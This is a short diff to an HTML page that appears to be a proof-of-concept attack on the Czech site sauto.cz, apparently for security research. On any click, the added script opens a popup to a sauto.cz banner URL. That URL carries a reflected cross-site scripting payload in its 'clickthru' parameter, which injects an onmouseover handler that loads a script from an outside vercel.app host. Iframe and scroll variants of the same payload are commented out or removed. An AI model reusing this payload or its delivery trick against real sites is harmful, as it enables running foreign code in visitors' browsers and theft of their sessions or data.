@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <title>Title</title>
     <style>
+        html, body {
+            height: 200vh;
+        }
         body {
             margin: 0;
             overflow: hidden;
@@ -32,14 +35,29 @@
 <body>
 <overlay></overlay>
 <script>
+    document.addEventListener('click', (e) => {
+        const x = e.x - (e.x / 2);
+        const y = e.y - (e.y / 2);
+        window.open(
+            'https://www.sauto.cz/bannerova-reklama?perPage=4&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app/index.js%27);%20document.head.appendChild(s)',
+            '_blank',
+            "height=600, width=300, resizable=0, scrollbars=0, status=0, titlebar=0, toolbar=0, location=0, menubar=0, left=" + x + ", top=" + y
+        );
+    });
     // alert('Hi');
 
-    const src = "https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app/index.js%27);%20document.head.appendChild(s)";
-    const iframe = document.createElement("iframe");
-    iframe.setAttribute("scrolling", "no");
-    iframe.src = src;
-    iframe.setAttribute("frameborder", "0");
-    document.body.appendChild(iframe);
+    // confirm('test');
+    // document.addEventListener('scroll', () => {
+    //     window.open('https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app/index.js%27);%20document.head.appendChild(s)');
+    // });
+
+
+    // const src = "https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app/index.js%27);%20document.head.appendChild(s)";
+    // const iframe = document.createElement("iframe");
+    // iframe.setAttribute("scrolling", "no");
+    // iframe.src = src;
+    // iframe.setAttribute("frameborder", "0");
+    // document.body.appendChild(iframe);
 </script>
 </body>
 </html>
